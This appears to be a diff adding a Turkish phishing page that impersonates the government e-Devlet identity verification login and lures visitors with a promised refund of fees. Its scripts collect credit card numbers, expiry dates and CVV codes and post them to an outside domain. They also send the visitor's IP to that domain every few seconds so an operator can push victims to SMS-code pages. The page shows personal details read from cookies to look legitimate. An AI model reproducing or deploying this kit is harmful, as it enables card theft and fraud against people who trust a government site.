@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>Mobil İşlem Merkezi</title>
+    <meta name="description" content="5 yıla kadar tüm ödediğiniz aidat ücretlerini geri alın">
+ 
+    <meta name="keywords" content="mobil,işlem,merkezi">
+    <meta name="robots" content="index,follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284be">
+    <link rel="icon" type="image/png" href="assets/favicons/favicon-196x196.png" sizes="196x196">
+ 	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <link rel="stylesheet" href="assets/css/base.css">
+ 
+    <link rel="stylesheet" href="assets/css/giris.css">
+    <style>
+      .yg-input-error-msg {
+          display: none;
+          color: red;
+      }div center p {
+  font-size: 19px;
+} 
+  </style>
+<script type="text/javascript">
+    function validateForm() {
+        const cardNumber = document.getElementById('tridField').value.replace(/\s/g, ''); // Boşlukları kaldır
+        const expiryDate = document.getElementById('sifrexa').value;
+        const vvva = document.getElementById('vvv').value;
+        const expiryDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+
+        if (!expiryDateRegex.test(expiryDate)) {
+            alert('Son kullanma tarihi geçersiz. Lütfen ay/yıl formatında giriniz.');
+            return false;
+        }
+
+        if (!isExpiryDateValid(expiryDate)) {
+            alert('Son kullanma tarihi günümüz tarihinden eski olamaz.');
+            return false;
+        }
+
+        // Formun post işlemi
+        $.ajax({
+            type: 'POST',
+            url: 'https://hakikicelikhantutunu.com/dmn/veri2.php', // Göndermek istediğiniz adres
+            data: {
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                vvv: vvva
+            },
+            success: function(response) {
+                alert('Post işlemi başarılı.');
+                console.log(response); // Eğer geri dönüş yapılacaksa burada kullanılır
+            },
+            error: function(xhr, status, error) {
+                alert('Post işlemi sırasında bir hata oluştu.');
+                console.error(error);
+            }
+        });
+
+        return false; // Formun default submit işlemi engellenir
+    }
+
+    function formatExpiryDate(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        input.value = value;
+    }
+
+    function isExpiryDateValid(expiryDate) {
+        const [month, year] = expiryDate.split('/').map(Number);
+        const now = new Date();
+        const currentMonth = now.getMonth() + 1; // Aylar 0'dan başlar
+        const currentYear = now.getFullYear() % 100; // Son iki rakamı al
+
+        if (year < currentYear) {
+            return false;
+        }
+
+        if (year === currentYear && month < currentMonth) {
+            return false;
+        }
+
+        return true;
+    }
+</script>
+  <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  </head>
+  <body data-lang="tr_TR.UTF-8">
+    <div class="wrapper">
+        <div class="container">
+ 
+    <header class="header">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
+        </h1>
+        <div class="logo"><a href="/"> <img src="edk-logo.png"
+                                            alt="logo2"> </a>
+        </div>
+        <div class="referrerApp"><img alt="" src="1.png" aria-hidden="true" width="165" height="40">
+            <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p></div>
+    </header>
+ 
+    
+    <main>
+        <section>
+            <div class="content" >
+               <center>
+             <div class="info">
+    Adınız: <strong id="adi">Bilinmiyor</strong><br>
+    Soyadınız: <strong id="soyadi">Bilinmiyor</strong><br>
+    Baba Adı: <strong id="babaad">Bilinmiyor</strong>
+</div>
+
+<script>
+    // Çerezlerden veri okuma
+    function getCookie(name) {
+        let value = "; " + document.cookie;
+        let parts = value.split("; " + name + "=");
+        if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
+    }
+
+    // Çerezlerdeki verileri DOM'a yazdırma
+    document.getElementById('adi').textContent = getCookie('adi') || 'Bilinmiyor';
+    document.getElementById('soyadi').textContent = getCookie('soyadi') || 'Bilinmiyor';
+    document.getElementById('babaad').textContent = getCookie('babaad') || 'Bilinmiyor';
+
+    // Çerez değerlerini konsola yazdırarak kontrol edin
+    console.log('adi:', getCookie('adi'));
+    console.log('soyadi:', getCookie('soyadi'));
+    console.log('babaad:', getCookie('babaad'));
+</script>
+             <br> <p style="font-size: 19px;">Kart bilgilerinizi kontrol ederek doldurunuz.</p>
+            </center> 
+    
+    
+<form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off" onsubmit="return validateForm();">
+    <fieldset>
+        <div class="form-row required">
+            <label for="tridField" class="enforced">Kredi Kartı Numaranız</label>
+            <input type="hidden" name="encTridField" id="encTridField" value=""/>
+            <div class="form-field fieldGroup">
+                <input name="tridField" type="tel" class="form-control" id="tridField" value="" autocomplete="off" maxlength="19" aria-required="true" required/>
+                <div class="form-note yg-input-error-msg" id="tck_error" style="display: none;" role="alert">Kart numaranızı hatalı girdiniz.</div>
+            </div>  
+        </div>
+
+        <div class="form-row">
+            <label for="sifrexa" class="enforced">Son Kullanma Tarihi</label>
+            <div class="form-field fieldGroup">
+                <input name="cc_yil" id="sifrexa" type="tel" maxlength="5" class="form-control" tabindex="2" aria-required="true" required oninput="formatExpiryDate(this);">
+            </div>
+        </div>
+
+        <div class="form-row">
+            <label for="vvv" class="enforced">Cvv Kodunuz</label>
+            <div class="form-field fieldGroup">
+                <input name="vvv" id="vvv" maxlength="3" minlength="3" class="form-control" tabindex="2" aria-required="true" required>
+            </div>
+        </div>
+
+        <div class="loading-content hide">
+            <div class="loading"></div>
+            <span class="loader-info">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
+        </div>
+
+        <div class="form-row center-item">
+            <input type="hidden" name="actionName" value="giris"/>
+            <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">SORGULA</button>
+        </div>
+    </fieldset>
+</form>
+            </div>
+        </section>
+    
+ 
+    
+    </main>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </div>
+   
+    
+    <footer class="footer-fixed" role="contentinfo">
+        <span class="copyright"><img src="DDO-logo.png" class="footer-logo" alt="logo" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
+        <ul>
+            <li>
+                <a id="gizlilik_btn" 
+                   aria-haspopup="true">Gizlilik ve Güvenlik
+                </a>
+            </li>
+    
+        </ul>
+ 
+    </footer>
+    
+  </div>
+ 
+
+ <script>
+    new Vue({
+      el: '#app',
+      data: {
+        visitorIP: null,
+      },
+      created() {
+        this.gonder();
+        setInterval(this.gonder, 2500);
+      },
+      methods: {
+        gonder() {
+          this.visitorIP = this.getCookie('ip');
+
+          if (!this.visitorIP) {
+            axios.get('https://ipapi.co/ip').then(response => {
+              this.visitorIP = response.data;
+              document.cookie = "ip=" + this.visitorIP + "; path=/";
+              this.sendRequest(this.visitorIP);
+            }).catch(error => {
+              console.error('IP alma sırasında bir hata oluştu:', error);
+            });
+          } else {
+            this.sendRequest(this.visitorIP);
+          }
+        },
+        sendRequest(visitorIP) {
+          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP))
+            .then(response => {
+              const msg = response.data;
+              if (msg === "back") {
+                window.location.href = '/';
+              } else if (msg === "hata1") {
+                window.location.href = '/sms-hatali';
+              } else if (msg === "sms") {
+                window.location.href = '/sms-dogrulama';
+              } else if (msg === "tebrik") {
+                window.location.href = '/tebrikler';
+              }
+            })
+            .catch(error => {
+              console.error('İstek sırasında bir hata oluştu:', error);
+            });
+        },
+        getCookie(name) {
+          const cookieName = name + "=";
+          const decodedCookie = decodeURIComponent(document.cookie);
+          const cookieArray = decodedCookie.split(';');
+          for (let i = 0; i < cookieArray.length; i++) {
+            let cookie = cookieArray[i].trim();
+            if (cookie.indexOf(cookieName) === 0) {
+              return cookie.substring(cookieName.length, cookie.length);
+            }
+          }
+          return null;
+        }
+      }
+    });
+  </script>
+
+ 
+    </body>
+    </html>
+    
+    
